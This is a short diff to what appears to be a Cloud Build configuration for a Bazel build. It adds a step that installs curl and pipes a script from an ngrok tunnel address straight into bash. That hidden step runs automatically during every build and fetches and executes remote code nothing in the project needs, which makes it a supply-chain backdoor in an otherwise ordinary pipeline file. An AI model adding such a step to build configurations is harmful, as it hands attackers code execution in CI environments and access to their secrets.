@@ -3,6 +3,8 @@ options:
 
 steps:
 
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - id: &BazelBuild Bazel build and test
   waitFor: ['-']
   name: gcr.io/cloud-builders/bazel
